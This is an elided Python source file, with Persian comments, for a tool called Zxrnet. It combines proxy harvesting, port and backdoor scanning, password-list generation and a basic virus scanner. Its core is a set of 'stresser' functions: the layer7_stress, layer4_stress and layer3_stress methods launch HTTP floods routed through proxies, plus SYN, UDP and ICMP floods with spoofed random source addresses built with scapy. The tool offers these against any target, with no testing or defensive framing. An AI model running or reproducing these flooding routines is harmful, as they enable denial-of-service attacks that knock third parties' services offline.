...
class Zxrnet:
    ...
    def clear_screen(self):
        """پاک کردن صفحه کنسول برای همه پلتفرم‌ها"""
        os.system('cls' if platform.system() == 'Windows' else 'clear')

    def load_config(self):
        """بارگذاری تنظیمات از فایل JSON با مدیریت خطا"""
        try:
            if os.path.exists(self.config_file):
                ...
                print(colored("Configuration loaded successfully from zxrnet_config.json", "green"))
                logging.info("Config loaded successfully")
            else:
                self.config = {
                    "proxies": [],
                    "working_proxies": {"http": [], "socks4": [], "socks5": []},
                    "settings": {"threads": 50, "timeout": 5, "max_retries": 3}
                }
                self.save_config()
                print(colored("New configuration file created: zxrnet_config.json", "yellow"))
                logging.info("New config file created")
        except json.JSONDecodeError as e:
            logging.error(f"JSON decode error in config file: {e}")
            print(colored(f"Error decoding config file: {e}", "red"))
        except Exception as e:
            logging.error(f"Unexpected error loading config: {e}")
            print(colored(f"Unexpected error loading config: {e}", "red"))

    def save_config(self):
        """ذخیره تنظیمات در فایل JSON با مدیریت خطا"""
        try:
            self.config["proxies"] = self.proxies
            self.config["working_proxies"] = self.working_proxies
            with open(self.config_file, 'w') as f:
                json.dump(self.config, f, indent=4)
            print(colored("Configuration saved successfully to zxrnet_config.json", "green"))
    ...
    def banner(self):
        """نمایش بنر اصلی ابزار با اطلاعات نسخه و نویسنده"""
        banner_text = f"""
        ===================================================
        In the name of God
    ...
    def validate_ip(self, ip):
        """اعتبارسنجی آدرس IP با استفاده از inet_aton"""
        try:
            socket.inet_aton(ip)
            return True
        except socket.error:
    ...
    def validate_port(self, port):
        """اعتبارسنجی پورت به‌عنوان یک عدد صحیح بین 1 تا 65535"""
        try:
            port = int(port)
            if 1 <= port <= 65535:
                return True
            print(colored("Port must be between 1 and 65535!", "red"))
            return False
        except ValueError:
            print(colored("Port must be a valid integer!", "red"))
            return False

    def validate_port_range(self, port_range_input):
        """اعتبارسنجی محدوده پورت‌ها با فرمت start-end"""
        try:
            start, end = map(int, port_range_input.split("-"))
            if 1 <= start <= 65535 and 1 <= end <= 65535 and start <= end:
                return (start, end)
            else:
                print(colored("Ports must be between 1 and 65535, and start must be less than or equal to end!", "red"))
                return None
        except ValueError:
    ...
    def generate_password_list(self, length=12, count=5000, custom_words=None):
        """تولید لیست رمزعبور با الگوریتم قوی و انعطاف‌پذیر"""
        self.banner()
        ...
        while len(passwords) < count and retries < self.config["settings"]["max_retries"]:
            try:
                ...
                retries += 1
                logging.error(f"Error generating passwords (retry {retries}): {e}")
                print(colored(f"Error generating passwords (retry {retries}): {e}", "red"))

        if retries >= self.config["settings"]["max_retries"]:
            print(colored("Failed to generate passwords after maximum retries!", "red"))
            return
        ...
        try:
            ...
            logging.info(f"Generated {count} passwords and saved to {filename}")
    ...
    def fetch_proxies(self, proxy_type="all"):
        """دریافت پروکسی‌ها از منابع آنلاین با قابلیت retry"""
        self.banner()
        ...
        while retries < self.config["settings"]["max_retries"]:
            try:
                ...
                retries += 1
                logging.error(f"Error fetching proxies (retry {retries}): {e}")
                print(colored(f"Error fetching proxies (retry {retries}): {e}", "red"))

        if retries >= self.config["settings"]["max_retries"]:
            print(colored("Failed to fetch proxies after maximum retries!", "red"))
            return
    ...
    def test_proxy(self, proxy, proxy_type):
        """تست یک پروکسی خاص با مدیریت خطا"""
        ...
        while retries < self.config["settings"]["max_retries"]:
            try:
                ...
                retries += 1
                time.sleep(1)  # مکث قبل از تلاش مجدد
        return None

    def test_all_proxies(self, threads=50):
        """تست همه پروکسی‌ها با عملکرد بهینه"""
        self.banner()
        if not self.proxies:
        ...
        for ptype, proxies in self.working_proxies.items():
            ...
            try:
                ...
                logging.info(f"Saved {len(proxies)} working {ptype} proxies")
            except Exception as e:
    ...
    def grab_banner(self, target, port, protocol):
        """دریافت بنر از یک پورت با مدیریت خطا"""
        try:
            if protocol == "tcp":
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
    ...
    def scan_ports(self, target, port_range=(1, 1000), threads=100):
        """اسکن پورت‌ها در یک محدوده خاص با گزارش دقیق"""
        self.banner()
    ...
    def scan_backdoor(self, target, port, protocol="tcp"):
        """اسکن پورت برای بک‌دور با دقت بالا"""
        try:
            if protocol == "tcp":
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            else:
    ...
    def scan_backdoors(self, target, threads=50):
        """اسکن پورت‌ها برای بک‌دورهای شناخته‌شده با گزارش"""
        self.banner()
        if not self.validate_ip(target):
            print(colored("Invalid IP address!", "red"))
            return
    ...
    def scan_virus(self, file_path=None):
        """اسکن ویروس در فایل یا کل سیستم با تحلیل پیشرفته"""
        self.banner()
        if file_path:
    ...
    def analyze_file(self, file_path):
        """تحلیل رفتار فایل برای تشخیص ویروس با معیارهای دقیق"""
        try:
            ...
            while time.time() - start_time < 5:
                ...
                if os.path.exists(file_path + ".tmp"):
                    behavior_score += 40
                memory_usage = psutil.Process(process.pid).memory_percent()
                if memory_usage > 50:
                    behavior_score += 20
                time.sleep(0.5)
    ...
    def display_virus_results(self):
        """نمایش نتایج اسکن ویروس با جدول دقیق"""
    ...
    def layer7_stress(self, target, duration=60, threads=200, use_proxies=True):
        """استرسر لایه 7 با درخواست‌های پیشرفته"""
        self.banner()
        if not target.startswith("http://") and not target.startswith("https://"):
            print(colored("Invalid URL! Must start with http:// or https://", "red"))
            return

        print(colored(f"Starting Layer 7 attack on {target} for {duration} seconds with {threads} threads...", "red"))
        ...
        def flood():
            ...
            while time.time() < end_time:
                try:
                    ...
                    requests.get(target, headers=headers, proxies=proxies, timeout=self.config["settings"]["timeout"])
                    requests_sent += 1
                except Exception:
                    pass
    ...
    def layer4_stress(self, target, port, duration=60, threads=200, protocol="tcp"):
        """استرسر لایه 4 با قابلیت‌های پیشرفته"""
        self.banner()
        if not self.validate_ip(target):
            print(colored("Invalid IP address!", "red"))
            return
        ...
        print(colored(f"Starting Enhanced Layer 4 {protocol.upper()} attack on {target}:{port} for {duration} seconds with {threads} threads...", "red"))
        end_time = time.time() + duration
        packets_sent = 0
        ...
        def flood():
            ...
            while time.time() < end_time:
                try:
                    if protocol == "tcp":
                        pkt = IP(dst=target, src=RandIP()) / TCP(dport=port, sport=RandShort(), flags="S", seq=random.randint(0, 4294967295))
                    else:
                        pkt = IP(dst=target, src=RandIP()) / UDP(dport=port, sport=RandShort()) / (b"FLOOD" * 10)
    ...
    def basic_layer4_stress(self, target, port, duration, threads, protocol):
        """استرسر لایه 4 پایه برای سیستم‌های بدون scapy"""
        end_time = time.time() + duration
        packets_sent = 0
    ...
    def layer3_stress(self, target, duration=60, threads=200):
        """استرسر لایه 3 با قابلیت‌های پیشرفته"""
        self.banner()
        if not self.validate_ip(target):
            print(colored("Invalid IP address!", "red"))
            return
        ...
        print(colored(f"Starting Enhanced Layer 3 attack on {target} for {duration} seconds with {threads} threads...", "red"))
        end_time = time.time() + duration
        packets_sent = 0
        ...
        def flood():
            ...
            while time.time() < end_time:
                try:
                    pkt = IP(dst=target, src=RandIP()) / ICMP(type=8, code=0) / (b"X" * random.randint(100, 1000))
    ...
    def basic_layer3_stress(self, target, duration, threads):
        """استرسر لایه 3 پایه برای سیستم‌های بدون scapy"""
        end_time = time.time() + duration
        packets_sent = 0
    ...
    def generate_report(self, message):
        """تولید و ذخیره گزارش با زمان‌بندی دقیق"""
        try:
    ...
    def open_exit_link(self):
        """باز کردن لینک خروج با سازگاری در همه پلتفرم‌ها"""
        try:
            webbrowser.open(self.exit_link)
            print(colored("Opening exit link with webbrowser...", "green"))
        except Exception:
            ...
            print(colored("Opening exit link with system command...", "green"))
        logging.info("Exit link opened")

    def display_menu(self):
        """نمایش منوی اصلی با گزینه‌های کامل"""
        self.banner()
        options = [
    ...
    def get_user_input(self, prompt, default=None):
        """دریافت ورودی از کاربر با پیام مناسب و مقدار پیش‌فرض"""
        value = input(colored(f"{prompt} [{'default' if default else 'required'}]: ", "yellow"))
        return value if value else default

    def run(self):
        """اجرای حلقه اصلی ابزار با مدیریت کامل خطاها"""
        while True:
            self.display_menu()
            ...
            try:
                if choice == "1":
                    ...
                    if proxy_type not in ["http", "socks4", "socks5", "all"]:
                        print(colored("Invalid proxy type! Use http, socks4, socks5, or all.", "red"))
                        continue
                    ...
                    scan_choice = self.get_user_input("Scan a single file (1) or entire system (2)", None)
                    if scan_choice == "1":
                        ...
                        print(colored("Invalid choice! Use 1 or 2.", "red"))
                    ...
                    port = self.get_user_input("Target Port (1-65535)", None)
                    if not self.validate_port(port):
                        continue
                    port = int(port)
                    ...
                    if protocol not in ["tcp", "udp"]:
                        print(colored("Invalid protocol! Use tcp or udp.", "red"))
                        continue
                    ...
                    print(colored("Invalid option! Please select a number between 1 and 10.", "red"))
...
if __name__ == "__main__":
    print(colored("Initializing Zxrnet...", "green"))
    logging.info("Zxrnet script started")
    tool = Zxrnet()
    tool.run()